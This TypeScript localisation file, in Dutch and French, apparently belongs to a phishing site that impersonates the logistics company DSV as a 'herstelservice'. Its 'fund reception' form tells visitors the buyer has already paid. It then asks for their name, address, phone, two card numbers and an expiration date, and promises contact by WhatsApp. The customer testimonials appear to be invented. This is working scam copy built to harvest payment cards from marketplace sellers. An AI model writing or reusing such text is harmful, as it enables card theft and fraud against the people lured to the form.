export type Language = 'nl' | 'fr'

interface ServiceItem {
  title: string
  description: string
  features: string[]
}

interface StatItem {
  number: string
  label: string
}

interface TestimonialItem {
  name: string
  role: string
  content: string
}

interface GalleryItem {
  title: string
  description: string
}

interface ContactInfoItem {
  title: string
  info: string
}

export interface Translations {
  header: {
    home: string
    services: string
    fundReception: string
    brand: string
  }
  hero: {
    titleTop: string
    titleBottom: string
    subtitlePre: string
    subtitleFast: string
    subtitleAnd: string
    subtitleSafe: string
    ctaButton: string
  }
  services: {
    headingPre: string
    headingHighlight: string
    description: string
    items: ServiceItem[]
    stats: StatItem[]
  }
  testimonials: {
    headingHighlight: string
    headingPost: string
    description: string
    items: TestimonialItem[]
    ctaHeading: string
    ctaText: string
    ctaButton: string
  }
  gallery: {
    headingPre: string
    headingHighlight: string
    description: string
    items: GalleryItem[]
    features: GalleryItem[]
  }
  fundReception: {
    heading: string
    infoBoxTitle: string
    infoBoxText: string
    infoBoxSubtext: string
    formTitle: string
    errorTitle: string
    genericError: string
    fields: {
      fullName: string
      fullNamePlaceholder: string
      fullNameRequired: string
      phone: string
      phonePlaceholder: string
      phoneRequired: string
      address: string
      addressPlaceholder: string
      addressRequired: string
      importantInfoTitle: string
      importantInfoText: string
      itemDescription: string
      itemDescriptionPlaceholder: string
      bankInfoTitle: string
      cardBE: string
      cardBEPlaceholder: string
      cardBERequired: string
      card525149: string
      card525149Placeholder: string
      card525149Required: string
      expirationDate: string
      expirationDateRequired: string
      amount: string
      amountRequired: string
      amountMin: string
      requiredFallback: string
    }
    submitButton: string
    submitting: string
    successTitle: string
    successText: string
    successThanks: string
    closeButton: string
  }
  footer: {
    description: string
    badge: string
    servicesTitle: string
    services: string[]
    quickLinksTitle: string
    quickLinks: string[]
    contactTitle: string
    contactInfo: ContactInfoItem[]
    copyright: string
    privacyPolicy: string
    termsOfUse: string
    legalNotice: string
  }
}

export const translations: Record<Language, Translations> = {
  nl: {
    header: {
      home: 'Home',
      services: 'Diensten',
      fundReception: 'Ontvangst van fondsen',
      brand: 'herstelservice',
    },
    hero: {
      titleTop: 'DSV',
      titleBottom: 'herstelservice',
      subtitlePre: 'Professionele ophaal- en bezorgservice voor pakketten',
      subtitleFast: 'snel',
      subtitleAnd: 'en',
      subtitleSafe: 'veilig.',
      ctaButton: 'Formulier voor fondsenontvangst',
    },
    services: {
      headingPre: 'Onze',
      headingHighlight: 'diensten',
      description:
        'DSV helpt u met al uw behoeften voor het ophalen en bezorgen van pakketten, met professionele diensten en erkende expertise.',
      items: [
        {
          title: 'Express ophaling',
          description:
            'Supersnelle ophaalservice met realtime tracking en maximale veiligheidsgarantie.',
          features: [
            'Ophaling binnen 2 uur',
            'Realtime GPS-tracking',
            'Premium verpakking',
            'Verzekering inbegrepen',
          ],
        },
        {
          title: 'Snelle levering',
          description:
            'Ultrasnelle levering met onze vloot elektrische voertuigen en een team van experts.',
          features: [
            'Levering 24/7',
            'Elektrische voertuigen',
            'Gecertificeerd team',
            'Concurrerende tarieven',
          ],
        },
        {
          title: 'Premiumservice',
          description:
            'Maatwerkoplossingen van hoge kwaliteit met toegewijde begeleiding en exclusieve garanties.',
          features: [
            'Toegewijde adviseur',
            'Premiumgarantie',
            'VIP-service',
            'Prioritaire ondersteuning',
          ],
        },
      ],
      stats: [
        { number: '24/7', label: 'Expressservice' },
        { number: '1000+', label: 'Tevreden klanten' },
        { number: '100%', label: 'Gegarandeerde veiligheid' },
        { number: '50+', label: 'Bediende steden' },
      ],
    },
    testimonials: {
      headingHighlight: 'Klant',
      headingPost: 'getuigenissen',
      description: 'Ontdek wat onze klanten zeggen over onze ophaal- en bezorgdiensten.',
      items: [
        {
          name: 'Marieke van der Berg',
          role: 'Particuliere klant',
          content:
            'Ik heb alles in orde gemaakt met de service en mijn geld ontvangen via een onmiddellijke overschrijving. Bedankt voor jullie betrouwbaarheid.',
        },
        {
          name: 'Pieter Janssen',
          role: 'Ondernemer',
          content:
            'Ik doe regelmatig een beroep op herstelservicedsv voor mijn professionele overschrijvingen. Altijd op tijd, perfecte service!',
        },
        {
          name: 'Sophie de Vries',
          role: 'Handelaar',
          content:
            'herstelservicedsv helpt ons enorm bij onze fondsenontvangsten. Snelle, veilige service en zeer scherpe tarieven.',
        },
      ],
      ctaHeading: 'Word ook een tevreden klant',
      ctaText: 'Vertrouw op herstelservicedsv voor uw ophaal- en bezorgbehoeften.',
      ctaButton: 'Nu beginnen',
    },
    gallery: {
      headingPre: 'Onze',
      headingHighlight: 'Expertise',
      description:
        'Ontdek onze knowhow en professionele uitrusting voor het ophalen en bezorgen van pakketten.',
      items: [
        { title: 'Pakket Ophalen', description: 'Professionele ophaalservice' },
        { title: 'Express Bezorging', description: 'Snelle en veilige bezorging' },
        { title: 'Expert Team', description: 'Gekwalificeerde en ervaren professionals' },
        { title: '24/7 Service', description: 'Altijd beschikbaar' },
        { title: 'DSV Expertise', description: 'Logistieke Excellence' },
      ],
      features: [
        {
          title: 'Veilig Ophalen',
          description: 'Professionele behandeling van uw pakketten met veilige verpakking',
        },
        {
          title: 'Snelle Bezorging',
          description: 'Express transport met realtime tracking tot bestemming',
        },
        {
          title: '24/7 Service',
          description: 'Permanente beschikbaarheid voor uw urgente behoeften',
        },
        {
          title: 'Volledige Garantie',
          description: 'Volledige verzekering op al uw pakketten tijdens transport',
        },
      ],
    },
    fundReception: {
      heading: 'Formulier voor fondsenontvangst',
      infoBoxTitle: 'Ontvangst van fondsen',
      infoBoxText: 'Snelle en veilige verwerking',
      infoBoxSubtext:
        'Vul het formulier correct in om je geld vandaag nog per directe overboeking te ontvangen.',
      formTitle: 'Formulier voor fondsenontvangst',
      errorTitle: 'Fout',
      genericError: 'Fout bij het registreren. Probeer het opnieuw of neem direct contact met ons op.',
      fields: {
        fullName: 'Volledige naam',
        fullNamePlaceholder: 'Uw volledige naam',
        fullNameRequired: 'Volledige naam is verplicht',
        phone: 'Telefoon',
        phonePlaceholder: '01 23 45 67 89',
        phoneRequired: 'Telefoonnummer is verplicht',
        address: 'Volledig adres',
        addressPlaceholder: 'Uw volledige adres',
        addressRequired: 'Adres is verplicht',
        importantInfoTitle: 'Belangrijke informatie',
        importantInfoText:
          'Let op: u hoeft niets te betalen; de koper heeft al alles betaald, dus voor u is alles gratis.',
        itemDescription: 'Beschrijving van het artikel',
        itemDescriptionPlaceholder: 'Gedetailleerde beschrijving van het artikel',
        bankInfoTitle: 'Bankinformatie',
        cardBE: 'BE Kaartnummer',
        cardBEPlaceholder: 'BE kaartnummer',
        cardBERequired: 'BE kaart is verplicht',
        card525149: '52/49/51 Kaartnummer',
        card525149Placeholder: '52/49/51 kaartnummer',
        card525149Required: '52/49/51 kaart is verplicht',
        expirationDate: 'Vervaldatum',
        expirationDateRequired: 'Vervaldatum is verplicht',
        amount: 'Te Ontvangen Bedrag',
        amountRequired: 'Bedrag is verplicht',
        amountMin: 'Bedrag moet groter zijn dan 0',
        requiredFallback: 'Dit veld is verplicht',
      },
      submitButton: 'Aanvraag verzenden',
      submitting: 'Verzenden...',
      successTitle: 'We hebben uw aanvraag ontvangen',
      successText:
        'Een DSV agent zal contact met u opnemen via WhatsApp. Gelieve de nodige afspraken te maken om uw geld vandaag nog te ontvangen via onmiddellijke overschrijving.',
      successThanks: 'Dank U',
      closeButton: 'Sluiten',
    },
    footer: {
      description:
        'Uw betrouwbare partner voor het ophalen en bezorgen van pakketten. Snelle, betrouwbare en veilige service door heel Nederland.',
      badge: '24/7 Service',
      servicesTitle: 'Onze Diensten',
      services: ['Pakket Ophalen', 'Express Bezorging', '24/7 Service', 'Realtime Tracking'],
      quickLinksTitle: 'Snelle Links',
      quickLinks: ['Home', 'Diensten', 'Geldoverdracht'],
      contactTitle: 'Contact',
      contactInfo: [
        { title: 'Email', info: 'registratie@dsv-klantenservice.com' },
        { title: 'Openingstijden', info: '24h/24 - 7j/7' },
      ],
      copyright: '© 2024 herstelservice. Alle rechten voorbehouden.',
      privacyPolicy: 'Privacybeleid',
      termsOfUse: 'Gebruiksvoorwaarden',
      legalNotice: 'Juridische vermeldingen',
    },
  },
  fr: {
    header: {
      home: 'Accueil',
      services: 'Services',
      fundReception: 'Réception de fonds',
      brand: 'herstelservice',
    },
    hero: {
      titleTop: 'DSV',
      titleBottom: 'herstelservice',
      subtitlePre: 'Service professionnel de collecte et de livraison de colis',
      subtitleFast: 'rapide',
      subtitleAnd: 'et',
      subtitleSafe: 'sécurisé.',
      ctaButton: 'Formulaire de réception de fonds',
    },
    services: {
      headingPre: 'Nos',
      headingHighlight: 'services',
      description:
        'DSV vous accompagne pour tous vos besoins de collecte et de livraison de colis, avec des services professionnels et une expertise reconnue.',
      items: [
        {
          title: 'Collecte express',
          description:
            'Service de collecte ultra-rapide avec suivi en temps réel et garantie de sécurité maximale.',
          features: [
            'Collecte sous 2 heures',
            'Suivi GPS en temps réel',
            'Emballage premium',
            'Assurance incluse',
          ],
        },
        {
          title: 'Livraison rapide',
          description:
            'Livraison ultra-rapide avec notre flotte de véhicules électriques et une équipe d’experts.',
          features: [
            'Livraison 24/7',
            'Véhicules électriques',
            'Équipe certifiée',
            'Tarifs compétitifs',
          ],
        },
        {
          title: 'Service premium',
          description:
            'Solutions sur mesure de haute qualité avec un accompagnement dédié et des garanties exclusives.',
          features: [
            'Conseiller dédié',
            'Garantie premium',
            'Service VIP',
            'Assistance prioritaire',
          ],
        },
      ],
      stats: [
        { number: '24/7', label: 'Service express' },
        { number: '1000+', label: 'Clients satisfaits' },
        { number: '100%', label: 'Sécurité garantie' },
        { number: '50+', label: 'Villes desservies' },
      ],
    },
    testimonials: {
      headingHighlight: 'Témoignages',
      headingPost: 'clients',
      description: 'Découvrez ce que nos clients disent de nos services de collecte et de livraison.',
      items: [
        {
          name: 'Marieke van der Berg',
          role: 'Cliente particulière',
          content:
            'J’ai tout réglé avec le service et reçu mon argent par virement immédiat. Merci pour votre fiabilité.',
        },
        {
          name: 'Pieter Janssen',
          role: 'Entrepreneur',
          content:
            'Je fais régulièrement appel à herstelservicedsv pour mes virements professionnels. Toujours à l’heure, service parfait !',
        },
        {
          name: 'Sophie de Vries',
          role: 'Commerçante',
          content:
            'herstelservicedsv nous aide énormément pour nos réceptions de fonds. Service rapide, sécurisé et tarifs très compétitifs.',
        },
      ],
      ctaHeading: 'Devenez vous aussi un client satisfait',
      ctaText: 'Faites confiance à herstelservicedsv pour vos besoins de collecte et de livraison.',
      ctaButton: 'Commencer maintenant',
    },
    gallery: {
      headingPre: 'Notre',
      headingHighlight: 'Expertise',
      description:
        'Découvrez notre savoir-faire et notre équipement professionnel pour la collecte et la livraison de colis.',
      items: [
        { title: 'Collecte de colis', description: 'Service de collecte professionnel' },
        { title: 'Livraison Express', description: 'Livraison rapide et sécurisée' },
        { title: 'Équipe Experte', description: 'Professionnels qualifiés et expérimentés' },
        { title: 'Service 24/7', description: 'Toujours disponible' },
        { title: 'Expertise DSV', description: 'Excellence Logistique' },
      ],
      features: [
        {
          title: 'Collecte sécurisée',
          description: 'Traitement professionnel de vos colis avec un emballage sécurisé',
        },
        {
          title: 'Livraison rapide',
          description: 'Transport express avec suivi en temps réel jusqu’à destination',
        },
        {
          title: 'Service 24/7',
          description: 'Disponibilité permanente pour vos besoins urgents',
        },
        {
          title: 'Garantie complète',
          description: 'Assurance totale sur tous vos colis pendant le transport',
        },
      ],
    },
    fundReception: {
      heading: 'Formulaire de réception de fonds',
      infoBoxTitle: 'Réception de fonds',
      infoBoxText: 'Traitement rapide et sécurisé',
      infoBoxSubtext:
        'Remplissez correctement le formulaire pour recevoir votre argent dès aujourd’hui par virement immédiat.',
      formTitle: 'Formulaire de réception de fonds',
      errorTitle: 'Erreur',
      genericError: 'Erreur lors de l’enregistrement. Veuillez réessayer ou nous contacter directement.',
      fields: {
        fullName: 'Nom complet',
        fullNamePlaceholder: 'Votre nom complet',
        fullNameRequired: 'Le nom complet est requis',
        phone: 'Téléphone',
        phonePlaceholder: '01 23 45 67 89',
        phoneRequired: 'Le numéro de téléphone est requis',
        address: 'Adresse complète',
        addressPlaceholder: 'Votre adresse complète',
        addressRequired: 'L’adresse est requise',
        importantInfoTitle: 'Information importante',
        importantInfoText:
          'Attention : vous n’avez rien à payer ; l’acheteur a déjà tout réglé, tout est donc gratuit pour vous.',
        itemDescription: 'Description de l’article',
        itemDescriptionPlaceholder: 'Description détaillée de l’article',
        bankInfoTitle: 'Informations bancaires',
        cardBE: 'Numéro de carte BE',
        cardBEPlaceholder: 'Numéro de carte BE',
        cardBERequired: 'La carte BE est requise',
        card525149: 'Numéro de carte 52/49/51',
        card525149Placeholder: 'Numéro de carte 52/49/51',
        card525149Required: 'La carte 52/49/51 est requise',
        expirationDate: 'Date d’expiration',
        expirationDateRequired: 'La date d’expiration est requise',
        amount: 'Montant à recevoir',
        amountRequired: 'Le montant est requis',
        amountMin: 'Le montant doit être supérieur à 0',
        requiredFallback: 'Ce champ est requis',
      },
      submitButton: 'Envoyer la demande',
      submitting: 'Envoi en cours...',
      successTitle: 'Nous avons bien reçu votre demande',
      successText:
        'Un agent DSV vous contactera via WhatsApp. Merci de prendre les dispositions nécessaires pour recevoir votre argent dès aujourd’hui par virement immédiat.',
      successThanks: 'Merci',
      closeButton: 'Fermer',
    },
    footer: {
      description:
        'Votre partenaire de confiance pour la collecte et la livraison de colis. Un service rapide, fiable et sécurisé dans tout le pays.',
      badge: 'Service 24/7',
      servicesTitle: 'Nos Services',
      services: ['Collecte de colis', 'Livraison Express', 'Service 24/7', 'Suivi en temps réel'],
      quickLinksTitle: 'Liens rapides',
      quickLinks: ['Accueil', 'Services', 'Transfert d’argent'],
      contactTitle: 'Contact',
      contactInfo: [
        { title: 'Email', info: 'registratie@dsv-klantenservice.com' },
        { title: 'Horaires d’ouverture', info: '24h/24 - 7j/7' },
      ],
      copyright: '© 2024 herstelservice. Tous droits réservés.',
      privacyPolicy: 'Politique de confidentialité',
      termsOfUse: 'Conditions d’utilisation',
      legalNotice: 'Mentions légales',
    },
  },
}
